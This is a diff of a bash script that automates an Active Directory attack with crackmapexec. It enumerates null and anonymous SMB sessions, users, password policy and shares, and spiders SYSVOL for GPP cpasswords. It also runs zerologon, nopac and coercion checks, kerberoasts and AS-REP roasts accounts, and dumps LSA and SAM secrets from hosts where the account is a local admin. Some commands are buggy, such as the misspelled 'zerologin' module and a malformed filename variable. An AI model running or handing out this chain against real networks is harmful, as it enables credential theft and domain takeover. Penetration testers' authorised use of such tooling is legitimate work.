@@ -17,7 +17,7 @@ echo ' '
 echo ' ' 
 echo ' '
 
-#usage : lazy-cme.sh user password dc-ip domain in-scope-ips-list
+#usage : meep.sh user password dc-ip domain in-scope-ips-list
 #echo 'Usage: lazy-cme.sh user password dc-ip domain in-scope-ips-list'
 
 
@@ -51,9 +51,9 @@ echo '<<<<<<<<<<<<<<<<<<<<<<<< NULL SESSIONS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 	if crackmapexec smb -u '' -p '' | grep '[+]'; then
 		echo 'SUCCESS!!'
 		echo 'Grabbing users and pass-pol'
-		crackmapexec smb -u '' -p '' --pass-pol | tee pass-pol-null.txt >> $LOGFILE
+		crackmapexec smb -u '' -p '' --pass-pol | tee pass-pol-null.txt | tee -a $LOGFILE
 		echo 'Running: crackmapexec smb --pass-pol | tee pass-pol-null.txt'
-		crackmapexec smb -u '' -p '' --users | tee unparsed-users-null.txt >> $LOGFILE
+		crackmapexec smb -u '' -p '' --users | tee unparsed-users-null.txt | tee -a $LOGFILE
 		echo 'Running: crackmapexec smb --users | tee unparsed-users-null.txt'
 	else
 		echo 'No null sessions :(' | tee -a $LOGFILE
@@ -80,9 +80,9 @@ echo '<<<<<<<<<<<<<<<<<<<<<<<< ANON SESSIONS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 	if crackmapexec smb -u 'a' -p '' | grep '[+]'; then
 		echo 'SUCCESS!!' 
 		echo 'Grabbing users and pass-pol'
-		crackmapexec smb -u 'a' -p '' --pass-pol | tee pass-pol-anon.txt >> $LOGFILE
+		crackmapexec smb -u 'a' -p '' --pass-pol | tee pass-pol-anon.txt | tee -a $LOGFILE
 		echo 'Running: crackmapexec smb --pass-pol | tee pass-pol-anon.txt'
-		crackmapexec smb -u 'a' -p '' --users | tee unparsed-users-anon.txt >> $LOGFILE
+		crackmapexec smb -u 'a' -p '' --users | tee unparsed-users-anon.txt | tee -a $LOGFILE
 		echo 'Running: crackmapexec smb --users | tee unparsed-users-anon.txt'
 	else
 		echo 'No anonymous sessions :(' | tee -a $LOGFILE
@@ -111,9 +111,9 @@ echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' | tee access-proof.
 
 	if crackmapexec smb $3 -d $4 -u $1 -p $2 | grep '[+]'; then
 		echo 'Lets get this bread'
-		crackmapexec smb $3 -d $4 -u $1 -p $2 | tee access-proof.txt >> $LOGFILE
+		crackmapexec smb $3 -d $4 -u $1 -p $2 | tee access-proof.txt | tee -a $LOGFILE
 	else
-		echo 'Check user and pass' >> $LOGFILE
+		echo 'Check user and pass' | tee -a $LOGFILE
 	fi
 
 echo ' '
@@ -136,14 +136,14 @@ echo 'USERS' >> $LOGFILE
 echo 'Grabbing users and parsing'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< USERS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --users| tee unparsed-users.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 --users | tee unparsed-users.txt >> $LOGFILE
+crackmapexec smb $3 -d $4 -u $1 -p $2 --users | tee unparsed-users.txt | tee -a $LOGFILE
 
 echo 'Cleaning up users...'
 echo "Running: 'cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | tee only-users.txt"
-cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | tee only-users.txt >> $LOGFILE
+cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | tee only-users.txt | tee -a $LOGFILE
 echo 'Getting domain\users'
 echo 'Running: cut -d " " -f 25 unparsed-users.txt | tee domain-users.txt'
-cut -d ' ' -f 25 unparsed-users.txt | tee domain-users.txt >> $LOGFILE
+cut -d ' ' -f 25 unparsed-users.txt | tee domain-users.txt | tee -a $LOGFILE
 
 echo ' '
 echo ' '
@@ -165,7 +165,7 @@ echo 'PASS POLICY' >> $LOGFILE
 echo 'Grabbing password policy'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< PASSWORD POLICY >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --pass-pol| tee pass-pol.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 --pass-pol | tee pass-pol.txt >> $LOGFILE
+crackmapexec smb $3 -d $4 -u $1 -p $2 --pass-pol | tee pass-pol.txt | tee -a $LOGFILE
 
 echo ' '
 echo ' '
@@ -187,7 +187,7 @@ echo 'SHARES' >> $LOGFILE
 echo 'Grabbing Shares'
 echo '<<<<<<<<<<<<<<<<<<<<<<<<SHARES>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'Runng: crackmapexec smb '$5' -u '$1' -p '$2' --shares | tee '$1'-shares.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 --shares | tee $1-shares.txt >> $LOGFILE
+crackmapexec smb $3 -d $4 -u $1 -p $2 --shares | tee $1-shares.txt | tee -a $LOGFILE
 echo 'Gonna have to manually run --spider on shares because Im too stupid to figure it out right meow'
 #while read i; do crackmapexec smb $i -u $1 -p $2 --shares | tee '$1'-shares.txt; done < $5
 
@@ -219,7 +219,7 @@ echo ' '
 date >> $LOGFILE
 echo 'PARSING SHARES' >> $LOGFILE
 echo 'Taking out all the useless shares like IPC, PRINT, and putting readable shares into ip-shares-onlyread.txt'
-cat $1-shares.txt | grep -vi 'read' | grep -vi 'ipc' | grep -vi 'print' | tee $1-shares-onlyread.txt >> $LOGFILE
+cat $1-shares.txt | grep -vi 'read' | grep -vi 'ipc' | grep -vi 'print' | tee $1-shares-onlyread.txt | tee -a $LOGFILE
 echo 'Manually search shares, building this for the future, listing commands to copy and paste'
 echo ' #crackmapexec smb <ip> -u '$1' -p '$2' --spider <share> --pattern .doc | tee <ip>-shares-docs.txt'
 echo ' #crackmapexec smb <ip> -u '$1' -p '$2' --spider <share> --pattern .txt | tee <ip>-shares-txt.txt'
@@ -248,23 +248,23 @@ echo 'SEARCHING GPP-AUTOLOGIN' >> $LOGFILE
 echo ' Grabbing goodies from SYSVOL'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< SYSVOL GOODIES >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'Running: crackmapexec smb '$3' -u '$1' -p '$2' -M gpp_autologin | tee dc-gpp-autologin.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 -M gpp_autologin | tee dc-gpp-autologin.txt >> $LOGFILE
+crackmapexec smb $3 -u $1 -p $2 -M gpp_autologin | tee dc-gpp-autologin.txt | tee -a $LOGFILE
 date >> $LOGFILE
 echo 'SEARCH GPP-PASSWORD' >> $LOGFILE
 echo 'Running: crackmapexec smb '$3' -u '$1' -p '$2' -M gpp_password | tee dc-gpp-password.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 -M gpp_password | tee dc-gpp-password.txt >> $LOGFILE
+crackmapexec smb $3 -u $1 -p $2 -M gpp_password | tee dc-gpp-password.txt | tee -a $LOGFILE
 date >> $LOGFILE
 echo 'SPIDERING CPASSWORD' >> $LOGFILE
 echo 'Running: crackmapexec smb '$3' -u '$1' -p '$2' --spider SYSVOL --pattern cpassword | tee dc-sysvol-pattern.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 --spider SYSVOL --pattern cpassword | tee dc-sysvol-pattern.txt >> $LOGFILE
+crackmapexec smb $3 -u $1 -p $2 --spider SYSVOL --pattern cpassword | tee dc-sysvol-pattern.txt | tee -a $LOGFILE
 date >> $LOGFILE
 echo 'SPIDERING ADMIN' >> $LOGFILE
 echo 'Running: crackmapexec smb '$3' -u '$1' -p '$2' --spider SYSVOL --pattern admin |tee -a dc-sysvol-pattern.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 --spider SYSVOL --pattern admin |tee -a dc-sysvol-pattern.txt >> $LOGFILE
+crackmapexec smb $3 -u $1 -p $2 --spider SYSVOL --pattern admin |tee -a dc-sysvol-pattern.txt | tee -a $LOGFILE
 date >> $LOGFILE
 echo 'SPIDERING PWD' >> $LOGFILE
 echo 'Running: crackmapexec smb '$3' -u '$1' -p '$2' --spider SYSVOL --pattern pwd | tee -a dc-sysvol-pattern.txt'
-crackmapexec smb $3 -d $4 -u $1 -p $2 --spider SYSVOL --pattern pwd | tee -a dc-sysvol-pattern.txt >> $LOGFILE
+crackmapexec smb $3 -u $1 -p $2 --spider SYSVOL --pattern pwd | tee -a dc-sysvol-pattern.txt | tee -a $LOGFILE
 
 echo "You gonna need to download the sysvol stuff with: smbclient -W "$4" -U "$1"%"$2" \\\\"$3"\sysvol"
 
@@ -292,16 +292,16 @@ date >> $LOGFILE
 echo 'EXPLOITS' >> $LOGFILE
 echo 'Checking for exploits'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< EXPLOITS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
-echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M zerologon | tee '$1'-vulns.txt'
-crackmapexec smb $5 -d $4 -u $1 -p $2 -M zerologin | tee $1-vulns.txt
-echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M nopac |tee -a '$1'-vulns.txt'
-crackmapexec smb $5 -d $4 -u $1 -p $2 -M nopac |tee -a $1-vulns.txt
-echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M petitpotam |tee -a '$1'-vulns.txt'
-crackmapexec smb $5 -d $4 -u $1 -p $2 -M petitpotam |tee -a $1-vulns.txt
-echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M webdav | tee -a '$1'-vulns.txt'
-crackmapexec smb $5 -d $4 -u $1 -p $2 -M webdav | tee -a $1-vulns.txt
-echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M shadowcoerce | tee -a '$1'-vulns.txt'
-crackmapexec smb $5 -d $4 -u $1 -p $2 -M shadowcoerce | tee -a '$1'-vulns.txt
+echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M zerologon | tee vulns.txt'
+crackmapexec smb $5 -u $1 -p $2 -M zerologin | tee vulns.txt | tee -a $LOGFILE
+echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M nopac |tee -a vulns.txt'
+crackmapexec smb $5 -u $1 -p $2 -M nopac |tee -a vulns.txt | tee -a $LOGFILE
+#echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M petitpotam |tee -a vulns.txt'
+#crackmapexec smb $5 -u $1 -p $2 -M petitpotam |tee -a vulns.txt
+echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M webdav | tee -a vulns.txt'
+crackmapexec smb $5 -u $1 -p $2 -M webdav | tee -a vulns.txt | tee -a $LOGFILE
+echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M shadowcoerce | tee -a vulns.txt'
+crackmapexec smb $5 -u $1 -p $2 -M shadowcoerce | tee -a vulns.txt | tee -a $LOGFILE
 
 echo ' '
 echo ' '
@@ -323,7 +323,7 @@ echo 'RDP ACCESS' >> $LOGFILE
 echo 'looking for RDP'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< RDP ACCESS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'Running: crackmapexec rdp '$5' -u '$1' -p '$2' | tee '$1'-rdp.txt'
-crackmapexec rdp $5 -d $4 -u $1 -p $2 | tee $1-rdp.txt >> $LOGFILE
+crackmapexec rdp $5 -u $1 -p $2 | tee $1-rdp.txt | tee -a $LOGFILE
 
 echo ' '
 echo ' '
@@ -345,7 +345,7 @@ echo 'KERBEROASTING' >> $LOGFILE
 echo 'Searching for kerberoasts...'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< KERBEROASTING >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'crackmapexec ldap '$3' -u '$1' -p '$2' --kerberoasting kerberoasts.txt'
-crackmapexec ldap $3 -d $4 -u $1 -p $2 --kerberoasting kerberoasts.txt >> $LOGFILE
+crackmapexec ldap $3 -u $1 -p $2 --kerberoasting kerberoasts.txt | tee -a $LOGFILE
 
 echo ' '
 echo ' '
@@ -367,18 +367,18 @@ echo 'ASREPROASTING' >> $LOGFILE
 echo 'Searching for asreproast...'
 echo '<<<<<<<<<<<<<<<<<<<<<<<< ASREPROASTING >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'crackmapexec ldap '$3' -u '$1' -p '$2' --asreproast asreproast.txt'
-crackmapexec ldap $3 -d $4 -u $1 -p $2 --asreproast asreproast.txt >> $LOGFILE
+crackmapexec ldap $3 -u $1 -p $2 --asreproast asreproast.txt | tee -a $LOGFILE
 
+echo ' '
+echo ' '
+echo ' '
+echo ' '
+echo ' Continuing '
+echo ' '
+echo ' '
+echo ' '
+echo ' '
 
-echo ' '
-echo ' '
-echo ' '
-echo ' '
-echo ' Done '
-echo ' '
-echo ' '
-echo ' '
-echo ' '
 
 ###############################################################################
 ###############################################################################
@@ -393,20 +393,30 @@ echo 'Running: crackmapexec smb '$5' -d '$4' -u '$1' -p '$2' | tee '$1'-local-ad
 
 for line in $(cat $5)
 do
-	crackmapexec smb $line -d $4 -u $1 -p $2 | tee $1-local-admin.txt >> $LOGFILE
+	crackmapexec smb $line -d $4 -u $1 -p $2 | tee $1-local-admin.txt | tee -a $LOGFILE
 done
 adminHosts=$1-local-admin.txt
 
-	if cat $adminHosts | grep -i 'pwn'; then 
-		pwn_hosts$(cat $1-local-admin.txt | grep -i 'pwn' | cut -d ' ' -f 2)
+	if cat $-local-admin.txt | grep -i 'pwn'; then 
+		pwn_hosts=$(cat $1-local-admin.txt | grep -i 'pwn' | cut -d ' ' -f 10)
 		echo 'Founds some local admins... dumping LSA and SAM'
 		date >> $LOGFILE
 		echo 'DUMPING LSA AND SAM' >> $LOGFILE
-		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 | tee $1-LSA-SAM.txt >> $LOGFILE
+		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa | tee LSA-SAM.txt | tee -a $LOGFILE
+		crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --sam | tee LSA-SAM.txt | tee -a $LOGFILE 
 	else
-		echo 'No local admins, might check --local-auth' >> $LOGFILE
+		echo 'No local admins, might check --local-auth' | tee -a $LOGFILE
 	fi
 
+echo ' '
+echo ' '
+echo ' '
+echo ' '
+echo ' Done '
+echo ' '
+echo ' '
+echo ' '
+echo ' '
 
 ###############################################################################
 
@@ -420,3 +430,5 @@ adminHosts=$1-local-admin.txt
 # add hash functionality
 # automate shares for crackmapexe
 # automate download sysvol
+
+
